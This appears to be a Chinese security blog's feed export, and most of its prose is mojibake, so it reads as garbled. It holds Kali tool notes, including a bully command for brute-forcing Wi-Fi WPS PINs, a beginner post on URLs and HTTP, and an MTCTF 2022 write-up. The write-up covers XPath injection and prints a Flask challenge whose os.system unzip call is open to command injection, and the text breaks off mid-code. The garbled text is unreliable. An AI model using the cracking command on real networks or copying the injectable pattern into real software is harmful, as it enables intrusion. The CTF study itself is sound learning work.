summary of the options      -v, --version                 Print the version number      -d, --debug                   Print status&#x2F;progress information      -s, --standard                Output address&#x2F;netmask pairs      -c, --cidr                    Output CIDR format address lists      -i, --cisco                   Output Cisco style address lists      -r, --range                   Output ip address ranges      -x, --hex                     Output address&#x2F;netmask pairs in hex      -o, --octal                   Output address&#x2F;netmask pairs in octal      -b, --binary                  Output address&#x2F;netmask pairs in binary      -n, --nodns                   Disable DNS lookups for addresses      -f, --files                   Treat arguments as input files    Definitions:      a spec can be any of:        address        address:address        address:+address        address&#x2F;mask      an address can be any of:        N           decimal number        0N          octal number        0xN         hex number        N.N.N.N     dotted quad        hostname    dns domain name      a mask is the number of bits set to one from the left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è¿™ä¸ªçœ‹å®˜æ–¹æ–‡æ¡£å§</p></li></ul></li></ul><h3 id="æƒ…æŠ¥åˆ†æ"><a href="#æƒ…æŠ¥åˆ†æ" class="headerlink" title="æƒ…æŠ¥åˆ†æ"></a>æƒ…æŠ¥åˆ†æ</h3><ul><li><p><strong>spiderfoot</strong>ï¼š</p><ul><li>ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨è¿›è¡Œå¤§é‡æŸ¥è¯¢çš„å·¥å…·</li><li>å¯åŠ¨éœ€è¦æŒ‡å®šå¥½ç›‘å¬çš„IPå’Œç«¯å£ï¼Œç„¶åæµè§ˆå™¨ç›´æ¥è®¿é—®å°±è¡Œå•¦</li><li>å¥½ç”¨çš„è€¶ï¼Œä¸€äº›èµ„äº§æœå¯»ä¸ç”¨æ‰‹åŠ¨åšäº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ²¡äº‹æœæœè‡ªå·±æ¥ä¿æŠ¤è‡ªå·±</li></ul></li><li><p><strong>theHarvester</strong>ï¼š</p><ul><li><p>è¿™ä¸ªå˜›å°±æ˜¯ä¸€ä¸ªæ‰‹åŠ¨çš„æœç´¢å·¥å…·å•¦ï¼Œç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£å°±å¥½</p></li><li><p>```<br>-d    â€“domain                    è¦æœç´¢çš„å…¬å¸åç§°æˆ–åŸŸåã€‚<br>-l    â€“limit                        é™åˆ¶æœç´¢ç»“æœçš„æ•°é‡ï¼Œé»˜è®¤=500ã€‚<br>-S    â€“start                        ä»ç»“æœç¼–å· X å¼€å§‹ï¼Œé»˜è®¤ = 0ã€‚<br>-g    â€“google-dork            ä½¿ç”¨ Google Dorks è¿›è¡Œ Google æœç´¢ã€‚<br>-p    â€“proxies                    å¯¹è¯·æ±‚ä½¿ç”¨ä»£ç†ï¼Œåœ¨ proxies.yaml ä¸­è¾“å…¥ä»£ç†<br>-s    â€“shodan                    ä½¿ç”¨ Shodan æŸ¥è¯¢å‘ç°çš„ä¸»æœºã€‚<br>â€“screenshot                    å¯¹å·²è§£æçš„åŸŸè¿›è¡Œæˆªå›¾ï¼ŒæŒ‡å®šè¾“å‡ºç›®å½•ï¼šâ€“screenshot output_directory<br>-v    â€“virtual-host        é€šè¿‡ DNS è§£æéªŒè¯ä¸»æœºåå¹¶æœç´¢è™šæ‹Ÿä¸»æœºã€‚<br>-e    â€“dns-server            ç”¨äºæŸ¥æ‰¾çš„ DNS æœåŠ¡å™¨ã€‚<br>-f    â€“filename                å°†ç»“æœä¿å­˜åˆ° XML å’Œ JSON æ–‡ä»¶ã€‚<br>-b    â€“source                    æŒ‡å®šæœç´¢çš„å¼•æ“å’Œæ•°æ®æº</p><p>#theHarvester -d [url] -l 300 -b [æœç´¢å¼•æ“åç§°]</p><pre class="line-numbers language-none"><code class="language-none">  - æ²¡ä¸Šä¸€ä¸ªè‡ªåŠ¨åŒ–çš„å¥½ç”¨ï¼Œä¸å¼€å¿ƒğŸ˜’## æ¼æ´åˆ†æ### Fuzzingå·¥å…·é›†## Webç¨‹åº## æ•°æ®åº“è¯„ä¼°è½¯ä»¶## å¯†ç æ”»å‡»## æ— çº¿æ”»å‡»### è“ç‰™å·¥å…·é›†### æ— çº¿å·¥å…·é›†- **bully**ï¼š  - Wi-Fiç ´è§£ï¼Œé€šè¿‡çˆ†ç ´WPSæ¨¡å¼ä¸‹7ä½é•¿åº¦PINå€¼æ¥è·å–Wi-Fiå¯†ç   - ä½¿ç”¨æ–¹æ³•  - &#96;&#96;&#96;shell    bully ç›‘å¬æ¨¡å¼ç½‘å¡å -b ç›®æ ‡BSSID -e ç›®æ ‡SSID -c ç›®æ ‡å¹¿æ’­ä¿¡é“<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>å¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šå‚æ•°ï¼Œä»–ä»¬çš„è·å–æ–¹å¼æˆ‘ä»¬ä¼šåœ¨åé¢æåˆ°</p></li><li><p>è¿˜æ²¡æœ‰è¯•è¿‡ï¼Œæ”¹å¤©å°è¯•ä¸€ä¸‹</p></li></ul></li><li><p><strong>Fern WiFi Cracker</strong>ï¼š</p><ul><li>å›¾å½¢åŒ–çš„Wi-Fiç ´è§£å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ç ´è§£è·¯ç”±åˆ°è®¾å¤‡çš„åŠ å¯†åŒ…æ¥å®ç°Wi-Fiå¯†ç è§£æ</li><li>ç­‰æˆ‘ç¬”è®°æœ¬kaliè£…å¥½çš„ï¼ˆ</li></ul></li></ul><h2 id="é€†å‘å·¥ç¨‹"><a href="#é€†å‘å·¥ç¨‹" class="headerlink" title="é€†å‘å·¥ç¨‹"></a>é€†å‘å·¥ç¨‹</h2><h2 id="æ¼æ´åˆ©ç”¨å·¥å…·é›†"><a href="#æ¼æ´åˆ©ç”¨å·¥å…·é›†" class="headerlink" title="æ¼æ´åˆ©ç”¨å·¥å…·é›†"></a>æ¼æ´åˆ©ç”¨å·¥å…·é›†</h2><h2 id="å—…æ¢-æ¬ºéª—"><a href="#å—…æ¢-æ¬ºéª—" class="headerlink" title="å—…æ¢/æ¬ºéª—"></a>å—…æ¢/æ¬ºéª—</h2><h3 id="ç½‘ç»œæ¬ºéª—"><a href="#ç½‘ç»œæ¬ºéª—" class="headerlink" title="ç½‘ç»œæ¬ºéª—"></a>ç½‘ç»œæ¬ºéª—</h3><ul><li><strong>sslsplit</strong>ï¼š</li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URLå’ŒHTTPåè®®</title>
      <link href="/posts/11f51f93.html"/>
      <url>/posts/11f51f93.html</url>
      
        <content type="html"><![CDATA[<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>é‡äº‹ä¸å†³å…ˆç™¾åº¦</p><blockquote><p>å› ç‰¹ç½‘ä¸Šçš„å¯ç”¨èµ„æºå¯ä»¥ç”¨ç®€å•å­—ç¬¦ä¸²æ¥è¡¨ç¤ºï¼Œè¯¥æ–‡æ¡£å°±æ˜¯æè¿°äº†è¿™ç§å­—ç¬¦ä¸²çš„è¯­æ³•å’Œè¯­ä¹‰ã€‚è€Œè¿™äº›å­—ç¬¦ä¸²åˆ™è¢«ç§°ä¸ºï¼šâ€œ<a href="https://baike.baidu.com/item/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E5%99%A8/7682460?fromModule=lemma_inlink">ç»Ÿä¸€èµ„æºå®šä½å™¨</a>â€ï¼ˆURLï¼‰ã€‚è¿™ç¯‡è¯´æ˜æºäºä¸‡ç»´ç½‘å…¨çƒä¿¡æ¯ä¸»åŠ¨ç»„ç»‡ï¼ˆWorld Wide Web global informationinitiativeï¼‰ä»‹ç»çš„æ¦‚å¿µã€‚RFC1630ã€Šé€šç”¨èµ„æºæ ‡å¿—ç¬¦ã€‹æè¿°äº†ä¸€äº›å¯¹è±¡æ•°æ®ï¼Œä»–ä»¬è‡ª1990å¹´èµ·å°±å¼€å§‹ä½¿ç”¨è¿™äº›å¯¹è±¡æ•°æ®ã€‚è¿™ç¯‡URLè¯´æ˜ç¬¦åˆã€Šå› ç‰¹ç½‘èµ„æºå®šä½ç¬¦çš„åŠŸèƒ½éœ€æ±‚ï¼ˆFunctional Requirements for Internet Resource Locatorsï¼‰ã€‹ä¸­è¯´æ˜çš„éœ€æ±‚ã€‚è¿™ç¯‡æ–‡æ¡£æ˜¯ç”±å·¥ç¨‹ä»»åŠ¡ç»„ç»‡ï¼ˆIETFï¼‰çš„URIå·¥ä½œå°ç»„å†™çš„ </p></blockquote><p>è‚¯å®šçœ‹ä¸æ‡‚å¯¹å§ï¼Œæ²¡å…³ç³»ï¼Œä½ åªéœ€è¦çŸ¥é“è¿™ä¸ªä¸œè¥¿æ˜¯ç”¨æ¥å¯»æ‰¾äº’è”ç½‘ä¸Šçš„èµ„æºå°±å¯ä»¥äº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªURLçš„å®Œæ•´æ ¼å¼</p><pre class="line-numbers language-none"><code class="language-none">scheme:[&#x2F;&#x2F;[user[:password]@]host[:port]][&#x2F;path][?query][#fragment]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è´´å¿ƒçš„ä¸­æ–‡ç¿»è¯‘</p><pre class="line-numbers language-none"><code class="language-none">åè®®:[&#x2F;&#x2F;[ç”¨æˆ·[:å¯†ç ]@]ä¸»æœº[:ç«¯å£]][&#x2F;è·¯å¾„][?é˜Ÿåˆ—][#ç‰‡æ®µ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹é¢æˆ‘ä»¬ä»¥ä¸€ä¸ªhttpåè®®çš„urlæ¥å¯¹ä¸Šé¢çš„å†…å®¹åšä¸€ä¸ªè§£é‡Š</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;jlan.darkflow.top&#x2F;posts&#x2F;58958.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬æ¥æŒ‰ç…§ä¸Šé¢çš„è¯­æ³•æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ˜¯ä»€ä¹ˆå†…å®¹</p><p>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯httpåè®®æ¥å¯¹jlan.darkflow.topè¿™ä¸ªæœåŠ¡ä¸»æœºè¿›è¡Œè®¿é—®ï¼Œè®¿é—®çš„æ˜¯/posts/58958.htmlè¿™ä¸ªç½‘é¡µèµ„æºï¼Œè¿™æ—¶å€™åº”è¯¥å°±ä¼šæœ‰äººé—®äº†ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªhttpçš„URLé‡Œé¢æ²¡æœ‰ç”¨æˆ·å•Šå¯†ç å•Šç«¯å£ä¹‹ç±»çš„ä¸œè¥¿å‘¢ï¼Œå¾ˆç®€å•ï¼Œå› ä¸ºè¿™äº›å†…å®¹éƒ½æ˜¯å¯é€‰é¡¹ï¼Œè€Œhttpåè®®å†…å®¹åŸºæœ¬éƒ½æ˜¯å…¬å¼€è®¿é—®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦æŒ‡æ˜æˆ‘ä»¬ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ä¸”httpåè®®çš„é»˜è®¤ç«¯å£æ˜¯80ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è®¿é—®è¿™ä¸ªURLçš„æ—¶å€™ä¼šè‡ªåŠ¨çš„å»80ç«¯å£å¯»æ‰¾èµ„æº</p><p>é‚£å¦‚æœæˆ‘ä»¬æ²¡æœ‰æŠŠhttpæœåŠ¡æ”¾åœ¨80ç«¯å£è€Œæ˜¯æ”¾åœ¨å…¶ä»–ç«¯å£å‘¢ï¼Œæ¥åšä¸ªå®éªŒï¼Œæˆ‘ä»¬ç”¨flaskèµ·ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œä½¿ç”¨80ç«¯å£ä½œä¸ºhttpæœåŠ¡çš„ç«¯å£<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243049.png"></p><p>æˆ‘ä»¬æ¥ç›´æ¥è®¿é—®çœ‹çœ‹ï¼Œè™½ç„¶æˆ‘ä»¬æ²¡æœ‰åœ¨URLä¸­æ·»åŠ ç«¯å£ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹ŸæˆåŠŸè®¿é—®åˆ°äº†æˆ‘ä»¬çš„webç«™ç‚¹ï¼Œæ·»åŠ äº†80ç«¯å£ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”ç”±äºæµè§ˆå™¨çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬åœ¨æ·»åŠ 80ç«¯å£åˆ°URLä¸­æ—¶é»˜è®¤æ˜¯ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥çš„</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262245054.png"></p><p>ä¸‹ä¸€æ­¥å°±æ˜¯å°†é»˜è®¤ç«¯å£è¿›è¡Œæ›´æ”¹ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨ä»£ç ä¸­å°†ç«¯å£æ›´æ”¹ä¸ºäº†10010ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å†æ¥ç›´æ¥è®¿é—®çœ‹çœ‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243232.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç°åœ¨ç”¨é»˜è®¤çš„80ç«¯å£å·²ç»è¡Œä¸é€šäº†ï¼Œé‚£æˆ‘ä»¬å°±åŠ ä¸Šæˆ‘ä»¬è‡ªå®šä¹‰çš„ç«¯å£å·å†æ¥è®¿é—®</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262248667.png"></p><p>å¯ä»¥çœ‹åˆ°è®¿é—®æˆåŠŸï¼Œå¹¶ä¸”åœ¨åœ°å€æ ä¹Ÿå‡ºç°äº†æˆ‘ä»¬è¾“å…¥çš„è‡ªå®šä¹‰ç«¯å£å·</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262251416.png"></p><p>é‚£ä¸‹ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªftpåè®®çš„URL</p><pre class="line-numbers language-none"><code class="language-none">ftp:&#x2F;&#x2F;jlan@127.0.0.1&#x2F;xxx&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬ä»¥Jlançš„èº«ä»½åœ¨127.0.0.1æœåŠ¡å™¨ä¸Šé¢æ‹¿ä¸€ä»½flagï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹Ÿæ²¡æœ‰æŒ‡å®šç«¯å£ï¼Œå› ä¸ºftpåè®®ä¹Ÿæ˜¯æœ‰é»˜è®¤ç«¯å£çš„ï¼Œå…¶å®å‡ ä¹æ‰€æœ‰åè®®éƒ½ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„ç«¯å£å·ï¼Œåœ¨ä¸€äº›ä½¿ç”¨è¿™äº›åè®®çš„ç¨‹åºä¸­å¤§éƒ¨åˆ†æƒ…å†µæˆ‘ä»¬éƒ½ä¸éœ€è¦å†é¢å¤–æ·»åŠ ç«¯å£</p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>è¯´å®Œäº†URLæˆ‘ä»¬æ¥è¯´å¦ä¸€ä¸ªwebçš„åŸºç¡€çŸ¥è¯†å°±æ˜¯HTTPåè®®ï¼ŒåŒæ ·å…ˆç™¾åº¦</p><blockquote><p>HTTPåè®®æ˜¯Hyper Text Transfer Protocolï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰çš„ç¼©å†™,æ˜¯ç”¨äºä»ä¸‡ç»´ç½‘ï¼ˆWWW:World Wide Web ï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ã€‚</p><p>HTTPæ˜¯ä¸€ä¸ªåŸºäºTCP/IPé€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTML æ–‡ä»¶, å›¾ç‰‡æ–‡ä»¶, æŸ¥è¯¢ç»“æœç­‰ï¼‰ã€‚</p><p>HTTPæ˜¯ä¸€ä¸ªå±äºåº”ç”¨å±‚çš„é¢å‘å¯¹è±¡çš„åè®®ï¼Œç”±äºå…¶ç®€æ·ã€å¿«é€Ÿçš„æ–¹å¼ï¼Œé€‚ç”¨äºåˆ†å¸ƒå¼è¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿã€‚å®ƒäº1990å¹´æå‡ºï¼Œç»è¿‡å‡ å¹´çš„ä½¿ç”¨ä¸å‘å±•ï¼Œå¾—åˆ°ä¸æ–­åœ°å®Œå–„å’Œæ‰©å±•ã€‚ç›®å‰åœ¨WWWä¸­ä½¿ç”¨çš„æ˜¯HTTP/1.0çš„ç¬¬å…­ç‰ˆï¼ŒHTTP/1.1çš„è§„èŒƒåŒ–å·¥ä½œæ­£åœ¨è¿›è¡Œä¹‹ä¸­ï¼Œè€Œä¸”HTTP-NG(Next Generation of HTTP)çš„å»ºè®®å·²ç»æå‡ºã€‚</p><p>HTTPåè®®å·¥ä½œäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¶æ„ä¸ºä¸Šã€‚æµè§ˆå™¨ä½œä¸ºHTTPå®¢æˆ·ç«¯é€šè¿‡URLå‘HTTPæœåŠ¡ç«¯å³WEBæœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚WebæœåŠ¡å™¨æ ¹æ®æ¥æ”¶åˆ°çš„è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯ã€‚</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2" alt="img"></p><p>ä¸Šé¢è¿™å¼ å›¾å°±å¾ˆå¥½çš„è¯´æ˜äº†HTTPåè®®å®šä¹‰çš„å†…å®¹</p><p>å•Šåæ­£HTTPåè®®å°±æ˜¯ä¸€ç§ä¼ è¾“ç½‘é¡µå†…å®¹çš„åè®®ï¼Œåè®®å°±æ˜¯åŒæ–¹å®šä¹‰äº†ä¸€ç§æ•°æ®äº¤æ¢çš„æ–¹å¼ï¼ŒæŒ‰ç…§è§„å®šçš„æ ¼å¼æ¥ä¼ è¾“æ•°æ®ï¼Œwebæ‰‹æ‰€è°“çš„â€œæŠ“åŒ…â€å°±æ˜¯å¯¹HTTPçš„æ•°æ®åŒ…è¿›è¡Œæ‹¦æˆªï¼Œç„¶åå–å‡ºå…¶ä¸­çš„åŸå§‹æ•°æ®ï¼Œå¤šè¯´æ— ç›Šï¼Œæˆ‘ä»¬æ¥å®é™…æŠ“åŒ…å°è¯•ä¸€ä¸‹ï¼Œè¿˜æ˜¯ä½¿ç”¨åˆšæ‰çš„webæœåŠ¡å™¨</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262325345.png"></p><p>çœ‹è¿™é‡Œå°±æ˜¯ä¸€æ•´ä¸ªå®Œæ•´çš„è¯·æ±‚å’Œå“åº”å†…å®¹äº†ï¼Œç¬¬ä¸€è¡Œæ˜¯è¯·æ±‚çš„æ–¹æ³•å’Œåè®®ï¼Œåé¢æ¯è¡Œéƒ½æ˜¯ä¸€ä¸ªè¯·æ±‚æ ‡å¤´ï¼Œæœ€åæœ‰ä¸€ä¸ªå›è½¦å’Œæ¢è¡Œç»“æŸï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„GETè¯·æ±‚ï¼Œé‚£POSTç±»å‹çš„è¯·æ±‚æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262335979.png"></p><p>å‘ç°è¯·æ±‚çš„æœ€ä¸‹é¢æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”åˆå¤šäº†ä¸€ä¸ªå«åšContent-Lengthçš„è¯·æ±‚å¤´ï¼Œè¿™ä¸ªè¯·æ±‚å¤´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨ï¼Œæˆ‘ä»¬åœ¨æœ€åä¸€ä¸ªæ¢è¡Œä¹‹åè¿˜æœ‰9å­—èŠ‚çš„å†…å®¹éœ€è¦ä¼ è¾“ï¼Œæˆ‘ä»¬è¯•è¯•åœ¨æœåŠ¡å™¨ä¸­å°†å†…å®¹å–å‡ºå¹¶ä¸”å›æ˜¾ï¼Œé‚£å¦‚æœæˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªè¯·æ±‚å¤´è®©å®ƒæ¯”æˆ‘ä»¬å®é™…çš„è¯·æ±‚çŸ­ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262336473.png"></p><p>å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æŒ‰ç…§æˆ‘ä»¬çš„è¯·æ±‚å¤´å£°æ˜çš„ä¸€æ ·ï¼Œåªå–äº†å‰8ä½çš„å†…å®¹ï¼Œè¿”å›äº†jla</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MTCTF 2022</title>
      <link href="/posts/94d6ea88.html"/>
      <url>/posts/94d6ea88.html</url>
      
        <content type="html"><![CDATA[<h2 id="babyjava"><a href="#babyjava" class="headerlink" title="babyjava"></a>babyjava</h2><p>ç›´æ¥æœXpathæ³¨å…¥å·¥å…·</p><p><a href="https://www.zhihuifly.com/t/topic/370">https://www.zhihuifly.com/t/topic/370</a></p><p>æŒ‰ç…§å¯¹åº”çš„URLä¸postä¼ å‚</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171837552.png"></p><p>æŒ‰è¯´æ˜ä¸€å±‚å±‚çˆ†å‡ºç»“æœï¼Œæœ€ç»ˆæ–‡æ¡£æ ‘å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">rootuserusernameï¼ˆflagåœ¨é‡Œé¢ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171843715.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;273f7d50-2f92-47ba-b5d4-358ae3add895&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="OnlineUnzip"><a href="#OnlineUnzip" class="headerlink" title="OnlineUnzip"></a>OnlineUnzip</h2><p>æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> make_responseapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extractFile</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    extractdir<span class="token operator">=</span>filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unzip -o </span><span class="token interpolation"><span class="token punctuation">&#123;</span>filepath<span class="token punctuation">&#125;</span></span><span class="token string"> -d </span><span class="token interpolation"><span class="token punctuation">&#123;</span>extractdir<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span>extractdir<span class="token operator">=</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/display'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/display/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/display/&lt;path:extractdir>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">display</span><span class="token punctuation">(</span>extractdir<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"\.\."</span><span class="token punctuation">,</span> extractdir<span class="token punctuation">,</span> re<span class="token punctuation">.</span>M <span class="token operator">|</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Hacker?"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> make_response<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>extractdir<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>                response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span>                <span class="token keyword">return</span> response            <span class="token keyword">else</span><span class="token punctuation">:</span>                fn <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span>                fn <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">".."</span><span 